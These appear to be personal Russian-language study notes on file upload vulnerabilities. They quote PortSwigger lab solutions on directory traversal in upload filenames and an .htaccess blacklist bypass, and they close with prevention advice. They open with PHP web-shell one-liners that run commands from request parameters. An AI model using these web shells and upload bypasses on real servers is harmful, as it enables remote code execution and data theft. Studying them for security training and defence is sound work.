# oneline
Код засунуть в <??>
`php echo passthru($_GET['cmd']);`
`php echo exec($_POST['cmd']);`
`php system($_GET['cmd']);`
`php passthru($_REQUEST['cmd']);`


`php echo file_get_contents('/path/to/target/file');`
`php echo system($_GET['command']);`
## dir travel.
filename="../exploit.php"
Если на такой POST приходит окей, то тогда можно менять расположения файла,  используя url encoding / обходим фильтрацию и тогдай файл сохраняется на директорию выше, где уже могут быть права на изменения файла. В случае успеха перемещаться тоже через url encode.

Вставка из решения таска Burp Suita:
>  n Burp Repeater, go to the tab containing the `POST /my-account/avatar` request and find the part of the request body that relates to your PHP file. In the `Content-Disposition` header, change the `filename` to include a [directory traversal](https://portswigger.net/web-security/file-path-traversal) sequence:  
    `Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`
Send the request. Notice that the response says `The file avatars/exploit.php has been uploaded.` This suggests that the server is stripping the directory traversal sequence from the file name.
   Obfuscate the directory traversal sequence by URL encoding the forward slash (`/`) character, resulting in:  
    `filename="..%2fexploit.php"`
   Send the request and observe that the message now says `The file avatars/../exploit.php has been uploaded.` This indicates that the file name is being URL decoded by the server.
  In the browser, go back to your account page.
   In Burp's proxy history, find the `GET /files/avatars/..%2fexploit.php` request. Observe that Carlos's secret was returned in the response. This indicates that the file was uploaded to a higher directory in the filesystem hierarchy (`/files`), and subsequently executed by the server. Note that this means you can also request this file using `GET /files/exploit.php`. >

## Обход blacklist.
На apache можно добавить правило выполнения произвольного расширения, как php файла, тогда он пройдет проверку blacklista.
>-   In Burp's proxy history, find the `POST /my-account/avatar` request that was used to submit the file upload. In the response, notice that the headers reveal that you're talking to an Apache server. Send this request to Burp Repeater.
-In Burp Repeater, go to the tab for the `POST /my-account/avatar` request and find the part of the body that relates to your PHP file. Make the following changes:
    -   Change the value of the `filename` parameter to `.htaccess`.
    -   Change the value of the `Content-Type` header to `text/plain`.
    -   Replace the contents of the file (your PHP payload) with the following Apache directive:  
        `AddType application/x-httpd-php .l33t`  
        This maps an arbitrary extension (`.l33t`) to the executable MIME type `application/x-httpd-php`. As the server uses the `mod_php` module, it knows how to handle this already.
   Send the request and observe that the file was successfully uploaded.
   Use the back arrow in Burp Repeater to return to the original request for uploading your PHP exploit.
   Change the value of the `filename` parameter from `exploit.php` to `exploit.l33t`. Send the request again and notice that the file was uploaded successfully.
   Switch to the other Repeater tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the name of your image file with `exploit.l33t` and send the request. Observe that Carlos's secret was returned in the response. Thanks to our malicious `.htaccess` file, the `.l33t` file was executed as if it were a `.php` file.

   # Обход через замену
   # Prevent
   Allowing users to upload files is commonplace and doesn't have to be dangerous as long as you take the right precautions. In general, the most effective way to protect your own websites from these vulnerabilities is to implement all of the following practices:

-   Check the file extension against a whitelist of permitted extensions rather than a blacklist of prohibited ones. It's much easier to guess which extensions you might want to allow than it is to guess which ones an attacker might try to upload.
-   Make sure the filename doesn't contain any substrings that may be interpreted as a directory or a traversal sequence (`../`).
-   Rename uploaded files to avoid collisions that may cause existing files to be overwritten.
-   Do not upload files to the server's permanent filesystem until they have been fully validated.
-   As much as possible, use an established framework for preprocessing file uploads rather than attempting to write your own validation mechanisms.